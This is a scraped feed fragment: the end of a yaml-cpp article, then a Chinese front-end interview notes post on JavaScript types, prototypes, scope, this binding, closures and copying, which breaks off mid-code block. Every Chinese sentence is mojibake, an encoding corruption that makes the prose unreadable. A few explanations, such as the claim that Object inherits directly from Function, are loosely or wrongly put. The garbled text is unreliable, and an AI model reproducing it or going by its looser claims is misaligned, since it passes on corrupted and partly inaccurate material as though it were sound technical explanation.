<p><code>yaml-cpp</code> ä¸ä»…ä»…æ˜¯ä¸€ä¸ªè§£æåº“ï¼Œé…åˆ C++ çš„ç±»å‹ç³»ç»Ÿï¼Œå®ƒèƒ½å¸®åŠ©æˆ‘ä»¬æ„å»ºå¥å£®çš„é…ç½®ç®¡ç†å±‚ã€‚åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œæ¨èå¤§å®¶å°½é‡é¿å…æ•£è½åœ¨ä»£ç å„å¤„çš„ <code>node["key"]</code> è°ƒç”¨ï¼Œè€Œæ˜¯é‡‡ç”¨æœ¬æ–‡ä»‹ç»çš„ <strong>Struct Mapping</strong> æ¨¡å¼ã€‚</p>
<p>å¦‚æœä½ æ­£åœ¨å¼€å¯ä¸€ä¸ªæ–°çš„ C++ é¡¹ç›®ï¼Œä¸å¦¨è¯•è¯•ç”¨ yaml-cpp æ¥ç®¡ç†ä½ çš„é…ç½®ï¼Œä½“éªŒä¸€ä¸‹ç»“æ„åŒ–æ•°æ®å¸¦æ¥çš„æŒæ§æ„Ÿï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰ç«¯é¢è¯•é¢˜æ•´ç†(æ–¹ä¾¿è‡ªå·±çœ‹çš„)]]></title>    <link>https://juejin.cn/post/7590011643296907302</link>    <guid>https://juejin.cn/post/7590011643296907302</guid>    <pubDate>2026-01-02T08:46:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590011643296907302" data-draft-id="7587785079737630726" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰ç«¯é¢è¯•é¢˜æ•´ç†(æ–¹ä¾¿è‡ªå·±çœ‹çš„)"/> <meta itemprop="keywords" content="å‰ç«¯,é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-02T08:46:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°±å«æ›²å¥‡é¥¼å¹²å§"/> <meta itemprop="url" content="https://juejin.cn/user/4212984288917575"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰ç«¯é¢è¯•é¢˜æ•´ç†(æ–¹ä¾¿è‡ªå·±çœ‹çš„)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4212984288917575/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°±å«æ›²å¥‡é¥¼å¹²å§
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T08:46:40.000Z" title="Fri Jan 02 2026 08:46:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»25åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JavaScripté¢˜</h2>
<h3 data-id="heading-1">1.JavaScriptä¸­çš„æ•°æ®ç±»å‹ï¼Ÿ</h3>
<p>åœ¨<code>JavaScriptä¸­</code>ï¼Œåˆ†ä¸¤ç§ç±»å‹:</p>
<ul>
<li>åŸºæœ¬ç±»å‹</li>
<li>å¼•ç”¨ç±»å‹</li>
</ul>
<p>åŸºæœ¬ç±»å‹ä¸»è¦æœ‰ä»¥ä¸‹6ç§ï¼š<code>Numberã€Stringã€Booleanã€Undefinedã€nullã€symbol</code>ã€‚
å¼•ç”¨ç±»å‹ä¸»è¦æœ‰<code>Objectã€Arrayã€Function</code>ã€‚å…¶å®ƒçš„æœ‰<code>Dateã€RegExpã€Mapç­‰</code>ã€‚</p>
<h3 data-id="heading-2">2.DOM</h3>
<p><code>æ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼ˆDOMï¼‰</code>æ˜¯<code>HTML</code>å’Œ<code>XML</code>æ–‡æ¡£çš„ç¼–ç¨‹æ¥å£ã€‚
æ—¥å¸¸å¼€å‘ç¦»ä¸å¼€<code>DOM</code>çš„æ“ä½œï¼Œå¯¹èŠ‚ç‚¹çš„å¢åˆ æ”¹æŸ¥ç­‰æ“ä½œã€‚åœ¨ä»¥å‰ï¼Œä½¿ç”¨<code>Jquery</code>,<code>zepto</code>ç­‰åº“æ¥æ“ä½œ<code>DOM</code>,ä¹‹ååœ¨<code>vue</code>,<code>Angular</code>,<code>React</code>ç­‰æ¡†æ¶å‡ºç°åï¼Œé€šè¿‡æ“ä½œæ•°æ®æ¥æ§åˆ¶<code>DOM</code>(å¤šæ•°æƒ…å†µä¸‹)ï¼Œè¶Šæ¥è¶Šå°‘çš„ç›´æ¥å»æ“ä½œ<code>DOM</code>ã€‚</p>
<h3 data-id="heading-3">3.BOM</h3>
<h4 data-id="heading-4">3.1 BOMæ˜¯ä»€ä¹ˆï¼Ÿ</h4>
<p><code>BOM</code>(Browser Object Model)ï¼Œæµè§ˆå™¨å¯¹è±¡æ¨¡å‹ï¼Œæä¾›äº†ç‹¬ç«‹äºå†…å®¹ä¸æµè§ˆå™¨çª—å£è¿›è¡Œäº¤äº’çš„å¯¹è±¡ã€‚å…¶ä½œç”¨å°±æ˜¯è·Ÿæµè§ˆå™¨åšä¸€äº›äº¤äº’æ•ˆæœï¼Œæ¯”å¦‚ï¼šè¿›è¡Œé¡µé¢çš„åé€€ã€å‰è¿›ã€åˆ·æ–°ã€æµè§ˆå™¨çª—å£å‘ç”Ÿå˜åŒ–ï¼Œæ»šåŠ¨æ¡æ»šåŠ¨ç­‰ã€‚</p>
<h4 data-id="heading-5">3.2 window</h4>
<p><code>Bom</code>çš„æ ¸å¿ƒå¯¹è±¡æ˜¯<code>window</code>,å®ƒè¡¨ç¤ºæµè§ˆå™¨çš„ä¸€ä¸ªå®ä¾‹ã€‚
åœ¨æµè§ˆå™¨ä¸­ï¼Œwindowå³æ˜¯æµè§ˆå™¨çª—å£çš„ä¸€ä¸ªæ¥å£ï¼Œåˆæ˜¯å…¨å±€å¯¹è±¡ã€‚</p>
<h3 data-id="heading-6">4 == å’Œ === åŒºåˆ«ï¼Œåˆ†åˆ«åœ¨ä»€ä¹ˆæƒ…å†µä½¿ç”¨</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/877bda4308f6465bb14d2bdba66d322e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCx5Y-r5puy5aWH6aW85bmy5ZCn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948400&amp;x-signature=yXYEa8YMxjwGuMV22acZv%2FDv0ds%3D" alt="image.png" loading="lazy"/></p>
<p>ç­‰äºæ“ä½œç¬¦ç”¨ä¿©ä¸ªç­‰äºå·(==)è¡¨ç¤ºï¼Œå¦‚æœæ“ä½œæ•°ç›¸ç­‰ï¼Œåˆ™ä¼šè¿”å›<code>true</code>ã€‚
ç­‰äºæ“ä½œç¬¦(==)åœ¨æ¯”è¾ƒä¸­ä¼šå…ˆè¿›è¡Œç±»å‹è½¬æ¢ï¼Œå†ç¡®å®šæ“ä½œæ•°æ˜¯å¦ç›¸ç­‰ã€‚</p>
<p>å…¨ç­‰æ“ä½œç¬¦ç”±3ä¸ªç­‰äºå·(===)è¡¨ç¤º,åªæœ‰ä¿©ä¸ªæ“ä½œæ•°åœ¨ä¸è½¬æ¢çš„å‰æä¸‹ç›¸ç­‰æ‰è¿”å›true,å³ç±»å‹ç›¸åŒï¼Œå€¼ä¹Ÿç›¸åŒã€‚</p>
<p>åŒºåˆ«ï¼šç­‰äºæ“ä½œç¬¦ï¼ˆ==ï¼‰ä¼šåšç±»å‹è½¬æ¢å†è¿›è¡Œå€¼çš„æ¯”è¾ƒï¼Œå…¨ç­‰æ“ä½œç¬¦ä¸ä¼šåšç±»å‹è½¬æ¢ã€‚
<code>null</code> å’Œ<code>undefined</code> æ¯”è¾ƒï¼Œç›¸ç­‰æ“ä½œç¬¦ä¸º<code>true</code> å…¨ç­‰ä¸º<code>false</code>ã€‚</p>
<h3 data-id="heading-7">5 typeof å’Œ instanceof çš„åŒºåˆ«</h3>
<p><code>typeof</code> æ“ä½œç¬¦è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæœªç»è®¡ç®—çš„æ“ä½œæ•°çš„ç±»å‹ã€‚</p>
<p><code>instanceof</code> è¿ç®—ç¬¦ç”¨äºæ£€æµ‹æ„é€ å‡½æ•°çš„<code>prototype</code>å±æ€§æ˜¯å¦å‡ºç°åœ¨æŸä¸ªå®ä¾‹å¯¹è±¡çš„åŸå‹é“¾ä¸Šã€‚</p>
<p>åŒºåˆ«ï¼š</p>
<ul>
<li><code>typeof</code> ä¼šè¿”å›ä¸€ä¸ªå˜é‡çš„åŸºæœ¬ç±»å‹ï¼Œ<code>instanceof</code> è¿”å›çš„æ˜¯ä¸€ä¸ª<code>Boolean</code>.</li>
<li><code>instanceof</code> å¯ä»¥å‡†ç¡®çš„åˆ¤æ–­å¤æ‚å¼•ç”¨æ•°æ®ç±»å‹ï¼Œä½†æ˜¯ä¸èƒ½æ­£ç¡®åˆ¤æ–­åŸºç¡€æ•°æ®ç±»å‹ã€‚</li>
<li>å¦‚æœéœ€è¦é€šç”¨æ£€æµ‹æ•°æ®ç±»å‹ï¼Œå¯ä»¥é€šè¿‡<code>Object.prototype.toString</code>,è°ƒç”¨è¯¥æ–¹æ³•ï¼Œç»Ÿä¸€è¿”å›æ ¼å¼
<code>[object XXX]</code>çš„å­—ç¬¦ä¸²ã€‚</li>
</ul>
<h3 data-id="heading-8">6 JavaScript åŸå‹ï¼ŒåŸå‹é“¾ï¼Ÿæœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼Ÿ</h3>
<h4 data-id="heading-9">åŸå‹</h4>
<p><code>JavaScript</code>å¸¸è¢«æè¿°ä¸ºä¸€ç§åŸºäºåŸå‹çš„è¯­è¨€---æ¯ä¸ªå¯¹è±¡æ‹¥æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡ã€‚è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶ï¼Œå®ƒä¸ä»…ä»…åœ¨è¯¥å¯¹è±¡ä¸Šæœå¯»ï¼Œè¿˜ä¼šæœå¯»è¯¥å¯¹è±¡çš„åŸå‹ï¼Œä»¥åŠè¯¥å¯¹è±¡åŸå‹çš„åŸå‹ï¼Œä¾æ¬¡å±‚å±‚å‘ä¸Šæœç´¢ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªåå­—åŒ¹é…çš„å±æ€§æˆ–è¾¾åˆ°åŸå‹é“¾çš„æœ«å°¾ã€‚</p>
<h4 data-id="heading-10">åŸå‹é“¾</h4>
<p>åŸå‹å¯¹è±¡ä¹Ÿå¯èƒ½æ‹¥æœ‰åŸå‹ï¼Œå¹¶ä»ä¸­ç»§æ‰¿æ–¹æ³•å’Œå±æ€§ï¼Œä¸€å±‚ä¸€å±‚ã€ä»¥æ­¤ç±»æ¨ã€‚è¿™ç§å…³ç³»å¸¸è¢«ç§°ä¸ºåŸå‹é“¾ï¼Œå®ƒè§£é‡Šäº†ä¸ºä½•ä¸€ä¸ªå¯¹è±¡ä¼šæ‹¥æœ‰å®šä¹‰åœ¨å…¶ä»–å¯¹è±¡ä¸­çš„å±æ€§å’Œæ–¹æ³•ã€‚</p>
<p>åœ¨å¯¹è±¡å®ä¾‹å’Œå®ƒçš„æ„é€ å™¨ä¹‹é—´å»ºç«‹ä¸€ä¸ªé“¾æ¥(å®ƒæ˜¯_proto_å±æ€§ï¼Œæ˜¯ä»æ„é€ å‡½æ•°çš„prototypeå±æ€§æ´¾ç”Ÿçš„)ï¼Œä¹‹åé€šè¿‡ä¸Šæº¯åŸå‹é“¾ï¼Œåœ¨æ„é€ å™¨ä¸­æ‰¾åˆ°è¿™äº›å±æ€§å’Œæ–¹æ³•ã€‚</p>
<ul>
<li>ä¸€åˆ‡å¯¹è±¡éƒ½æ˜¯ç»§æ‰¿è‡ª<code>Object</code>å¯¹è±¡ï¼Œobjectå¯¹è±¡ç›´æ¥ç»§æ‰¿æ ¹æºå¯¹è±¡<code>null</code></li>
<li>ä¸€åˆ‡çš„å‡½æ•°å¯¹è±¡ï¼ˆåŒ…æ‹¬<code>objectå¯¹è±¡</code>ï¼‰ï¼Œéƒ½æ˜¯ç»§æ‰¿è‡ª<code>Function</code>å¯¹è±¡</li>
<li><code>Object</code> å¯¹è±¡ç›´æ¥ç»§æ‰¿è‡ª <code>Function</code> å¯¹è±¡</li>
<li><code>Function</code> å¯¹è±¡çš„ <code>_proto_</code> ä¼šæŒ‡å‘è‡ªå·±çš„åŸå‹å¯¹è±¡ï¼Œæœ€ç»ˆè¿˜æ˜¯ç»§æ‰¿è‡ª <code>Object</code> å¯¹è±¡</li>
</ul>
<h3 data-id="heading-11">7.å¯¹ä½œç”¨åŸŸé“¾çš„ç†è§£</h3>
<p>ä½œç”¨åŸŸï¼Œå³å˜é‡å’Œå‡½æ•°ç”Ÿæ•ˆçš„åŒºåŸŸæˆ–é›†åˆï¼Œä½œç”¨åŸŸå†³å®šäº†ä»£ç åŒºå—ä¸­å˜é‡å’Œå…¶ä»–èµ„æºçš„å¯è§æ€§ã€‚</p>
<ul>
<li>å…¨å±€ä½œç”¨åŸŸï¼šä»»ä½•ä¸åœ¨å‡½æ•°ä¸­æˆ–æ˜¯å¤§æ‹¬å·ä¸­å£°æ˜çš„å˜é‡ï¼Œéƒ½æ˜¯åœ¨å…¨å±€ä½œç”¨åŸŸä¸‹ï¼Œå…¨å±€ä½œç”¨åŸŸä¸‹å£°æ˜çš„å˜é‡å¯ä»¥åœ¨ä»»æ„ä½ç½®è®¿é—®ã€‚</li>
<li>å‡½æ•°ä½œç”¨åŸŸï¼šå‡½æ•°ä½œç”¨åŸŸä¹Ÿå«å±€éƒ¨ä½œç”¨åŸŸï¼Œå¦‚æœä¸€ä¸ªå˜é‡æ˜¯åœ¨å‡½æ•°å†…éƒ¨å£°æ˜çš„ï¼Œå®ƒå°±åœ¨ä¸€ä¸ªå‡½æ•°ä½œç”¨åŸŸä¸‹é¢ã€‚è¿™äº›å˜é‡åªèƒ½åœ¨å‡½æ•°å†…éƒ¨è®¿é—®ï¼Œä¸èƒ½åœ¨å‡½æ•°ä»¥å¤–å»è®¿é—®ã€‚</li>
<li>å—çº§ä½œç”¨åŸŸï¼šES6å¼•å…¥äº†<code>let</code>å’Œ<code>const</code>å…³é”®å­—ï¼Œå’Œ<code>var</code>å…³é”®å­—ä¸åŒï¼Œåœ¨å¤§æ‹¬å·ä¸­ä½¿ç”¨<code>let</code>å’Œ<code>const</code>å£°æ˜çš„å˜é‡å­˜åœ¨äºå—çº§ä½œç”¨åŸŸä¸­ã€‚åœ¨å¤§æ‹¬å·å¤–é¢ä¸èƒ½è®¿é—®è¿™äº›å˜é‡ã€‚</li>
</ul>
<h4 data-id="heading-12">ä½œç”¨åŸŸé“¾</h4>
<p>å½“åœ¨<code>JavaScript</code>ä¸­ä½¿ç”¨ä¸€ä¸ªå˜é‡çš„æ—¶å€™ï¼Œé¦–å…ˆ<code>JavaScript</code>å¼•æ“ä¼šå°è¯•åœ¨å½“å‰ä½œç”¨åŸŸä¸‹å»å¯»æ‰¾è¯¥å˜é‡ï¼Œå¦‚æœæ²¡æ‰¾åˆ°ï¼Œå†åˆ°å®ƒçš„ä¸Šå±‚ä½œç”¨åŸŸå¯»æ‰¾ï¼Œä»¥æ­¤ç±»æ¨ç›´åˆ°æ‰¾åˆ°è¯¥å˜é‡æˆ–æ˜¯å·²ç»åˆ°äº†å…¨å±€ä½œç”¨åŸŸã€‚</p>
<h3 data-id="heading-13">8. è°ˆè°ˆå¯¹thiså¯¹è±¡çš„ç†è§£</h3>
<h4 data-id="heading-14">8.1å®šä¹‰</h4>
<p>å‡½æ•°çš„<code>this</code>å…³é”®å­—åœ¨<code>JavaScript</code>ä¸­çš„è¡¨ç°ç•¥æœ‰ä¸åŒï¼Œæ­¤å¤–ï¼Œåœ¨ä¸¥æ ¼æ¨¡å¼å’Œéä¸¥æ ¼æ¨¡å¼ä¹‹é—´ä¹Ÿä¼šæœ‰ä¸€äº›å·®åˆ«ã€‚åœ¨ç»å¤§æ•°æƒ…å†µä¸‹ï¼Œå‡½æ•°çš„è°ƒç”¨æ–¹å¼å†³å®šäº†<code>this</code>çš„å€¼ã€‚
<code>this</code>å…³é”®å­—æ˜¯å‡½æ•°è¿è¡Œæ—¶è‡ªåŠ¨ç”Ÿæˆçš„ä¸€ä¸ªå†…éƒ¨å¯¹è±¡ï¼Œåªèƒ½åœ¨å‡½æ•°å†…éƒ¨ä½¿ç”¨ï¼Œæ€»æŒ‡å‘è°ƒç”¨å®ƒçš„å¯¹è±¡ã€‚</p>
<h4 data-id="heading-15">8.2 newç»‘å®š</h4>
<p>é€šè¿‡æ„é€ å‡½æ•°<code>new</code> å…³é”®å­—ç”Ÿæˆä¸€ä¸ªå®ä¾‹å¯¹è±¡ï¼Œæ­¤æ—¶<code>this</code>æŒ‡å‘è¿™ä¸ªå®ä¾‹å¯¹è±¡ã€‚</p>
<p>apply()ã€call()ã€bind()ã€æ˜¯å‡½æ•°çš„ä¸€ä¸ªæ–¹æ³•ï¼Œä½œç”¨æ˜¯æ”¹å˜å‡½æ•°çš„è°ƒç”¨å¯¹è±¡ã€‚å®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°å°±è¡¨ç¤ºæ”¹å˜åçš„è°ƒç”¨è¿™ä¸ªå‡½æ•°çš„å¯¹è±¡ã€‚å› æ­¤ï¼Œè¿™æ—¶<code>this</code>æŒ‡çš„å°±æ˜¯è¿™ä¸ªç¬¬ä¸€ä¸ªå‚æ•°ã€‚</p>
<h4 data-id="heading-16">8.3 ç®­å¤´å‡½æ•°</h4>
<p>åœ¨ES6çš„è¯­æ³•ä¸­ï¼Œæä¾›äº†ç®­å¤´å‡½æ•°æ³•ï¼Œè®©æˆ‘ä»¬åœ¨ä»£ç ä¹¦å†™æ—¶å°±èƒ½ç¡®å®šthisçš„æŒ‡å‘ã€‚</p>
<h3 data-id="heading-17">9.newæ“ä½œç¬¦å…·ä½“å¹²äº†ä»€ä¹ˆ</h3>
<ul>
<li>åˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡</li>
<li>å°†å¯¹è±¡ä¸æ„å»ºå‡½æ•°é€šè¿‡åŸå‹é“¾é“¾æ¥èµ·æ¥</li>
<li>å°†æ„å»ºå‡½æ•°ä¸­çš„<code>this</code>ç»‘å®šåˆ°æ–°å»ºçš„å¯¹è±¡ä¸Š</li>
<li>æ ¹æ®æ„å»ºå‡½æ•°è¿”å›ç±»å‹åšåˆ¤æ–­ï¼Œå¦‚æœåŸå§‹å€¼åˆ™è¢«å¿½ç•¥ï¼Œå¦‚æœæ˜¯è¿”å›å¯¹è±¡ï¼Œéœ€è¦æ­£å¸¸å¤„ç†ã€‚</li>
</ul>
<h3 data-id="heading-18">10.bindã€callã€applyåŒºåˆ«ï¼Ÿ</h3>
<p><code>bind</code>ã€<code>call</code>ã€<code>apply</code>ã€ä½œç”¨æ˜¯æ”¹å˜å‡½æ•°æ‰§è¡Œæ—¶çš„ä¸Šä¸‹æ–‡ï¼Œæ”¹å˜å‡½æ•°è¿è¡Œæ—¶çš„thisæŒ‡å‘ã€‚</p>
<p>åŒºåˆ«ï¼š</p>
<ul>
<li>ä¸‰è€…éƒ½å¯ä»¥æ”¹å˜å‡½æ•°çš„<code>this</code>æŒ‡å‘</li>
<li>ä¸‰è€…ç¬¬ä¸€ä¸ªå‚æ•°éƒ½æ˜¯thisè¦æŒ‡å‘çš„å¯¹è±¡ï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸ªå‚æ•°æˆ–è€…å‚æ•°ä¸º<code>undefined</code>æˆ–<code>null</code>,åˆ™é»˜è®¤æŒ‡å‘å…¨å±€<code>window</code></li>
<li>ä¸‰è€…éƒ½å¯ä»¥ä¼ å‚ï¼Œä½†æ˜¯<code>apply</code>æ˜¯æ•°ç»„ï¼Œè€Œ<code>call</code>æ˜¯å‚æ•°åˆ—è¡¨ï¼Œä¸”<code>apply</code>å’Œ<code>call</code>æ˜¯ä¸€æ¬¡æ€§ä¼ å…¥å‚æ•°ï¼Œè€Œ<code>bind</code>å¯ä»¥åˆ†å¤šæ¬¡ä¼ å…¥</li>
<li><code>bind</code>æ˜¯è¿”å›ç»‘å®š<code>this</code>ä¹‹åçš„å‡½æ•°ï¼Œ<code>apply</code>ã€<code>call</code>åˆ™æ˜¯ç«‹å³æ‰§è¡Œ</li>
</ul>
<h3 data-id="heading-19">11.é—­åŒ…çš„ç†è§£ï¼Ÿé—­åŒ…ä½¿ç”¨åœºæ™¯ï¼Ÿ</h3>
<h4 data-id="heading-20">11.1 é—­åŒ…æ˜¯ä»€ä¹ˆï¼Ÿ</h4>
<p>ä¸€ä¸ªå‡½æ•°å’Œå¯¹å…¶å‘¨å›´çŠ¶æ€çš„å¼•ç”¨æ†ç»‘åœ¨ä¸€èµ·ï¼Œè¿™æ ·çš„ç»„åˆå°±æ˜¯é—­åŒ…ã€‚é—­åŒ…è®©ä½ å¯ä»¥åœ¨ä¸€ä¸ªå†…å±‚å‡½æ•°ä¸­è®¿é—®åˆ°å…¶å¤–å±‚å‡½æ•°çš„ä½œç”¨åŸŸã€‚</p>
<h4 data-id="heading-21">11.2 é—­åŒ…ä½¿ç”¨åœºæ™¯</h4>
<ul>
<li>åˆ›å»ºç§æœ‰å˜é‡</li>
<li>å»¶é•¿å˜é‡çš„ç”Ÿå‘½å‘¨æœŸ</li>
</ul>
<h4 data-id="heading-22">11.3 æŸ¯é‡ŒåŒ–å‡½æ•°</h4>
<p>æŸ¯é‡ŒåŒ–çš„ç›®çš„åœ¨äºé¿å…é¢‘ç¹è°ƒç”¨å…·æœ‰ç›¸åŒå‚æ•°å‡½æ•°çš„åŒæ—¶ï¼Œåˆèƒ½å¤Ÿè½»æ¾çš„é‡ç”¨ã€‚</p>
<h4 data-id="heading-23">11.4 é—­åŒ…çš„ç¼ºç‚¹</h4>
<p>å¦‚æœä¸æ˜¯æŸäº›ç‰¹å®šä»»åŠ¡éœ€è¦ä½¿ç”¨é—­åŒ…ï¼Œåœ¨å…¶å®ƒå‡½æ•°ä¸­åˆ›å»ºå‡½æ•°æ˜¯ä¸æ˜æ™ºçš„ï¼Œå› ä¸ºé—­åŒ…åœ¨å¤„ç†é€Ÿåº¦å’Œå†…å­˜æ¶ˆè€—æ–¹é¢å¯¹è„šæœ¬æ€§èƒ½æœ‰è´Ÿé¢å½±å“ã€‚</p>
<h3 data-id="heading-24">12.æ·±æ‹·è´æµ…æ‹·è´çš„åŒºåˆ«ï¼Ÿå®ç°ä¸€ä¸ªæ·±æ‹·è´ï¼Ÿ</h3>
<h4 data-id="heading-25">12.1 æµ…æ‹·è´</h4>
<p><code>Object.assign</code>ã€<code>Array.prototype.slice()</code>ã€<code>Array.prototype.concat()</code>ã€<code>æ‹“å±•è¿ç®—ç¬¦</code>å®ç°å¤åˆ¶ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">var</span> obj = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'xxx'</span>,
    <span class="hljs-attr">age</span>: <span class="hljs-number">17</span>
}
<span class="hljs-keyword">var</span> newObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({}, obj);
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> a = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>];
<span class="hljs-keyword">const</span> b = a.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>);
b[<span class="hljs-number">1</span>] = <span class="hljs-number">4</span>;
